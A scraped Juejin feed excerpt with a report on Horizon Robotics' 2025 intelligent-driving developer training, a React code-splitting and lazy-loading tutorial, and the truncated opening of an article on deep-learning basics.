.task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>11 月 30 日，由地平线、中国汽车工程学会主办，联合中国智能网联汽车产业创新联盟打造的 <strong>2025 智能驾驶开发者系列培训</strong>在北京圆满落幕。本次培训吸引了北京理工大学、吉林大学、长安大学、一汽、广汽、比亚迪、蔚来汽车、赛力斯、中信科智联、北斗智联、亿咖通等 <strong>60 余家</strong>来自全国高校、科研机构以及整车与零部件企业的广泛参与。累计参与人数​<strong>超 400 人</strong>​，<strong>106 位</strong>专业学员参与线下实践，现场气氛热烈，充分彰显智能驾驶技术在行业内的高关注度与强吸引力。</p>
</blockquote>
<p><img src="http://openwrite.cn/uploads/19742/57128/165379e8-6c4a-4ac1-9997-5b6cd4051951.jpg" alt="1280X1280.jpg" loading="lazy"/></p>
<h2 data-id="heading-0">智驾干货局！理论与实践落地，开发者狂飙ing</h2>
<p>2025 年培训课程在 2024 年基础上进行全面升级，课程布局更加完善，培训体系精心设计，覆盖基础进阶、高级卓越、实践应用，并特别设立高校教师专场。采用<strong>​“线上理论 + 线下实操”​</strong>系统教学的模式，全面覆盖智能驾驶领域的核心知识模块，包括硬件体系、软件开发、算法逻辑与工具链生态，旨在帮助学员打通知识脉络、强化技术根基，切实提升智能驾驶领域的理论认知与工程实战能力，为推动行业技术升级与产业变革注入新动能。</p>
<p><strong>第一阶段</strong>线上理论课程于 11 月 1 日至 11 月 24 日顺利举办，课程围绕智能驾驶的软硬件架构、关键算法、工具链全栈能力展开，内容由浅入深、逻辑清晰，系统化帮助学员构建起完整的技术认知框架，为后续实践学习打下扎实基础。</p>
<p><strong>第二阶段</strong>线下实践课程于 11 月 29 日至 30 日在京开班，课程由地平线资深工程师现场授课，围绕<strong>地平线天工开物 征程 6 算法工具链</strong>展开深度实操演练，内容覆盖算法工具链整体结构、量化原理、模型部署流程等核心环节。通过详细讲解训练后量化机制、模型产物分析、性能调优与精度调试工具的高效使用，再到统一异构计算平台的构建与神经网络推理、视觉处理等关键流程的实操训练，学员不仅加深了理解，更在实战中掌握了从算法量化到端侧部署的全流程核心技术，真正实现“学得会、用得上、落得下”。
<img src="http://openwrite.cn/uploads/19742/57128/6e57bb15-9465-4038-a956-c36d5ffa342d.png" alt="1280X1280 (1).PNG" loading="lazy"/></p>
<p><img src="http://openwrite.cn/uploads/19742/57128/4922d2f1-9d3e-4ace-8e0f-179106910835.png" alt="1280X1280 (2).PNG" loading="lazy"/><img src="http://openwrite.cn/uploads/19742/57128/6f743fc8-503f-4a1b-99c6-313006ada173.png" alt="1280X1280 (3).PNG" loading="lazy"/>
<img src="http://openwrite.cn/uploads/19742/57128/8f6b0e76-6c28-42bb-9ec1-871d4054cefa.png" alt="1280X1280 (4).PNG" loading="lazy"/>
<img src="http://openwrite.cn/uploads/19742/57128/b6f99ab5-7859-46c3-bb1a-aac79d06decc.png" alt="1280X1280 (5).PNG" loading="lazy"/>
<img src="http://openwrite.cn/uploads/19742/57128/e43c1f3e-a6ad-49c0-ac34-5630cd94f435.png" alt="1280X1280 (6).PNG" loading="lazy"/><img src="http://openwrite.cn/uploads/19742/57128/07605195-e304-4d71-8ca2-d76b8de24014.png" alt="1280X1280 (7).PNG" loading="lazy"/></p>
<p>本次培训以企业实际需求为导向，实现“人才培养-项目实践-岗位适配”的无缝衔接，为智能驾驶企业提供精准人才支撑与研发辅助；针对高校教师在智能驾驶教学中“理论与产业脱节、实操经验不足”的痛点，形成一套完整的教学指引与能力提升方案，推动教学从“知识传授”向“能力培养”转型；聚焦学生“理论知识碎片化、工程实践能力薄弱”的问题，通过沉浸式学习与实战锻炼，全面提升学生的专业素养与就业竞争力。</p>
<p>未来，地平线与中国汽车工程学会将持续推进智能驾驶领域人才建设，围绕行业发展方向，不断推出高质量的培训内容与人才服务，助力高校学科融合升级与企业研发能力跃升，持续为智能驾驶生态注入强劲的智力支持和创新活力。
<img src="http://openwrite.cn/uploads/19742/57128/41ca4a1f-f181-45f5-8147-ade47e261f2e.png" alt="8f1b9f5a-231a-489d-be68-80d43b021344.png" loading="lazy"/></p>
<p><img src="http://openwrite.cn/uploads/19742/57128/48d24905-7703-4d27-9127-8fa3f6c257b7.png" alt="502ee797-8f4e-4b5f-880b-4e74fd2ec6c6.png" loading="lazy"/></p>
<blockquote>
<p>中国智能网联汽车产业创新联盟介绍</p>
<p>为进一步推动我国智能网联汽车产业和技术发展，中国汽车工程学会、中国汽车工业协会在工信部的支持下，于 2017 年 6 月 12 日组建成立“中国智能网联汽车产业创新联盟”，工信部作为联盟指导单位。联盟自成立以来，已从行业自发成立的组织，发展成为既支撑政府决策、又服务行业发展的创新机构，充分发挥了跨产业、政产学研用协同创新的重要推动力量。按照约定的工作机制，联盟在政策和战略研究、关键共性技术研发、标准法规、测试示范、产业化推广、学术交流与国际合作、人才培养等方面开展工作并取得重要成果。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[别让你那 5MB 的 JS 文件把用户吓跑：React 代码分割（Code Splitting）实战指南]]></title>    <link>https://juejin.cn/post/7580282751627984937</link>    <guid>https://juejin.cn/post/7580282751627984937</guid>    <pubDate>2025-12-06T07:46:49.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580282751627984937" data-draft-id="7579427549471080494" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="别让你那 5MB 的 JS 文件把用户吓跑：React 代码分割（Code Splitting）实战指南"/> <meta itemprop="keywords" content="前端,JavaScript,React.js"/> <meta itemprop="datePublished" content="2025-12-06T07:46:49.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="大布布将军"/> <meta itemprop="url" content="https://juejin.cn/user/1535361573994189"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            别让你那 5MB 的 JS 文件把用户吓跑：React 代码分割（Code Splitting）实战指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1535361573994189/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    大布布将军
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-06T07:46:49.000Z" title="Sat Dec 06 2025 07:46:49 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言：你的网页为什么像个吃撑了的胖子？</h2>
<p>兄弟们，咱们先看一眼你们项目的 <code>build</code> 产物。
是不是有个 <code>index.js</code> 或者 <code>main.js</code>，体积高达 2MB、3MB 甚至更大？</p>
<p>这就好比你去餐厅吃饭，你只是想点一盘花生米（首屏登录页），结果服务员把后厨里所有的鱼翅燕窝鲍鱼（后台管理系统、富文本编辑器、Echarts 图表库）全部端上了桌，还把门堵住说：“不吃完不许走！”。</p>
<p>用户的 4G 信号在哭泣，手机 CPU 在发烫。
首屏加载时间（FCP）长达 5 秒，用户早就关掉页面去看抖音小姐姐了。</p>
<p>今天，我们要给你的 React 项目做个<strong>抽脂手术</strong>。我们要用到 <strong>Code Splitting（代码分割）</strong> 和 <strong>Lazy Loading（懒加载）</strong>，把那个巨大的 JS 文件切成无数个小块，<strong>只让用户加载他当前需要的东西</strong>。</p>
<hr/>
<h2 data-id="heading-1">手术刀一：路由级别的“大卸八块”</h2>
<p>绝大多数的 React 项目都是 SPA（单页应用）。
默认情况下，打包工具（Webpack/Vite）会把所有页面的代码打包进一个文件。
哪怕用户只访问首页，他也得下载“个人中心”、“设置”、“关于我们”的代码。</p>
<p><strong>这是最大的浪费。</strong></p>
<h3 data-id="heading-2">❌ 传统的梭哈写法（All in One）：</h3>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">BrowserRouter</span>, <span class="hljs-title class_">Routes</span>, <span class="hljs-title class_">Route</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'react-router-dom'</span>;

<span class="hljs-comment">// 💀 致命伤：静态引入。</span>
<span class="hljs-comment">// 只要 App.js 被加载，Dashboard 和 Settings 的代码也就跟着被下载了</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Home</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./pages/Home'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Dashboard</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./pages/Dashboard'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Settings</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./pages/Settings'</span>;

<span class="hljs-keyword">const</span> <span class="hljs-title function_">App</span> = (<span class="hljs-params"/>) =&gt; (
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">BrowserRouter</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">Routes</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">"/"</span> <span class="hljs-attr">element</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">Home</span> /&gt;</span>} /&gt;
      <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">"/dashboard"</span> <span class="hljs-attr">element</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">Dashboard</span> /&gt;</span>} /&gt;
      <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">"/settings"</span> <span class="hljs-attr">element</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">Settings</span> /&gt;</span>} /&gt;
    <span class="hljs-tag">&lt;/<span class="hljs-name">Routes</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">BrowserRouter</span>&gt;</span></span>
);
</code></pre>
<h3 data-id="heading-3">✅ 懒加载写法（按需取用）：</h3>
<p>我们要用 <code>React.lazy</code> 配合 <code>import()</code> 动态引入，再加个 <code>Suspense</code> 来处理加载过程中的空窗期。</p>
<pre><code class="hljs language-import" lang="import">import { BrowserRouter, Routes, Route } from 'react-router-dom';
import LoadingSpinner from './components/LoadingSpinner';

// ✨ 魔法在这里：动态引入
// 只有当路由匹配到 /dashboard 时，浏览器才会去下载 Dashboard.js
const Home = lazy(() =&gt; import('./pages/Home'));
const Dashboard = lazy(() =&gt; import('./pages/Dashboard'));
const Settings = lazy(() =&gt; import('./pages/Settings'));

const App = () =&gt; (
  &lt;BrowserRouter&gt;
    {/* ⏳ Suspense 是必须的：在组件下载下来之前，先给用户看个转圈圈 */}
    &lt;Suspense fallback={&lt;LoadingSpinner /&gt;}&gt;
      &lt;Routes&gt;
        &lt;Route path="/" element={&lt;Home /&gt;} /&gt;
        &lt;Route path="/dashboard" element={&lt;Dashboard /&gt;} /&gt;
        &lt;Route path="/settings" element={&lt;Settings /&gt;} /&gt;
      &lt;/Routes&gt;
    &lt;/Suspense&gt;
  &lt;/BrowserRouter&gt;
);
</code></pre>
<p>就改了这么几行代码，你的 <code>main.js</code> 体积可能瞬间减少 50% 以上。首屏速度直接起飞。</p>
<h2 data-id="heading-4">手术刀二：组件级别的“精细微雕”</h2>
<p>切完路由就完事了吗？ No No No。有些时候，<strong>同一个页面里</strong>也有巨大的胖子。</p>
<p><strong>场景</strong>：你有一个“数据分析”页面，平时只展示列表。只有当用户点击“查看图表”按钮弹出一个 Modal 时，才需要渲染一个巨大的 <code>ECharts</code> 或者 <code>Recharts</code> 图表。 这玩意儿动不动就几百 KB。</p>
<p>如果用户根本不点那个按钮，这几百 KB 不就白下载了？</p>
<h3 data-id="heading-5">❌ 笨重写法：</h3>
<pre><code class="hljs language-import" lang="import">// 💀 哪怕不渲染，import 进来了就会被打包
import HeavyChart from './components/HeavyChart'; 
import HeavyEditor from './components/HeavyEditor';

const AnalysisPage = () =&gt; {
  const [showChart, setShowChart] = useState(false);

  return (
    &lt;div&gt;
      &lt;button onClick={() =&gt; setShowChart(true)}&gt;看图&lt;/button&gt;
      {/* 虽然条件渲染了，但代码早就下载好了 */}
      {showChart &amp;&amp; &lt;HeavyChart /&gt;}
    &lt;/div&gt;
  );
};
</code></pre>
<p>✅ 极致懒人写法：</p>
<pre><code class="hljs language-import" lang="import">
// ✨ 只有用到我的时候，才来喊我
const HeavyChart = lazy(() =&gt; import('./components/HeavyChart'));

const AnalysisPage = () =&gt; {
  const [showChart, setShowChart] = useState(false);

  return (
    &lt;div&gt;
      &lt;button onClick={() =&gt; setShowChart(true)}&gt;看图&lt;/button&gt;
      
      {showChart &amp;&amp; (
        &lt;Suspense fallback={&lt;div&gt;图表加载中...&lt;/div&gt;}&gt;
          &lt;HeavyChart /&gt;
        &lt;/Suspense&gt;
      )}
    &lt;/div&gt;
  );
};
</code></pre>
<h2 data-id="heading-6">注意：别切得太碎了（避坑指南）</h2>
<p>听到切代码能优化性能，有些兄弟兴奋了，拿起刀就是一顿乱切。 把 <code>Button</code>、<code>Icon</code>、<code>Text</code> 全部懒加载。</p>
<p><strong>千万别！</strong></p>
<ol>
<li><strong>HTTP 请求开销</strong>：每个 lazy 组件都会发起一个新的网络请求。如果你把一个 1KB 的按钮切出来，光是 HTTP 握手的时间都比下载它的时间长。</li>
<li><strong>闪屏体验</strong>：如果页面全是 <code>Suspense</code>，用户一进来看到满屏的 Loading 转圈，体验比白屏还差。</li>
</ol>
<p><strong>切割原则</strong>：</p>
<ul>
<li><strong>按路由切</strong>：这是必须的。</li>
<li><strong>按“重型组件”切</strong>：富文本编辑器、图表库、3D 模型渲染、地图组件。</li>
<li><strong>按“交互后展示”切</strong>：弹窗（Modal）、侧边栏（Drawer）、折叠面板（Collapse）。</li>
</ul>
<h2 data-id="heading-7">进阶技巧：预加载（Preload）—— 预判你的预判</h2>
<p>懒加载有一个小缺点：用户点击的时候才开始下载，会有几百毫秒的延迟。 如果要在性能和体验之间求极致，我们可以玩<strong>预加载</strong>。</p>
<p>比如：用户鼠标悬停在“查看图表”按钮上时，我们猜他大概率要点击了，这时候偷偷开始下载。</p>
<pre><code class="hljs language-const" lang="const">
// 或者写个简单的函数
const prefetchChart = () =&gt; {
  const component = import('./components/HeavyChart');
};

&lt;button 
  onMouseEnter={prefetchChart} // 鼠标放上去就开始下
  onClick={() =&gt; setShowChart(true)}
&gt;
  看图
&lt;/button&gt;
</code></pre>
<h2 data-id="heading-8">总结</h2>
<p>现在的打包工具（Vite/Webpack）已经非常智能了，但它们不懂你的业务。它们不知道哪个页面是核心，哪个组件是冷门。</p>
<p><strong>Code Splitting</strong> 就是把你对业务的理解告诉工具： “这个首页要最快速度出来！” “那个富文本编辑器，等用户真要写文章了再去加载！”</p>
<p>把你的应用从“一块大石头”变成“一堆小积木”，按需拿取。这才是现代前端工程化的精髓。</p>
<p>好了，我要去把那个引入了整个 <code>lodash</code> 却只用了一个 <code>debounce</code> 函数的屎山代码给优化了。</p>
<hr/>
<blockquote>
<p><strong>下期预告</strong>：你还在用 <code>console.log</code> 调试代码吗？你还在面对满屏的红字不知所措吗？ 下一篇，我们要聊聊 <strong>“React 调试神技”</strong> 。带你深入 React DevTools，看看那些你从未点过的按钮，是如何让你像 X 光一样看穿组件的。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[小猫都能懂的大模型原理 1 - 深度学习基础]]></title>    <link>https://juejin.cn/post/7580277964341395466</link>    <guid>https://juejin.cn/post/7580277964341395466</guid>    <pubDate>2025-12-06T07:59:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580277964341395466" data-draft-id="7580277964341297162" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="小猫都能懂的大模型原理 1 - 深度学习基础"/> <meta itemprop="keywords" content="Agent,LLM,程序员"/> <meta itemprop="datePublished" content="2025-12-06T07:59:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="大模型教程"/> <meta itemprop="url" content="https://juejin.cn/user/1145012233707299"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            小猫都能懂的大模型原理 1 - 深度学习基础
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1145012233707299/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    大模型教程
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-06T07:59:22.000Z" title="Sat Dec 06 2025 07:59:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator 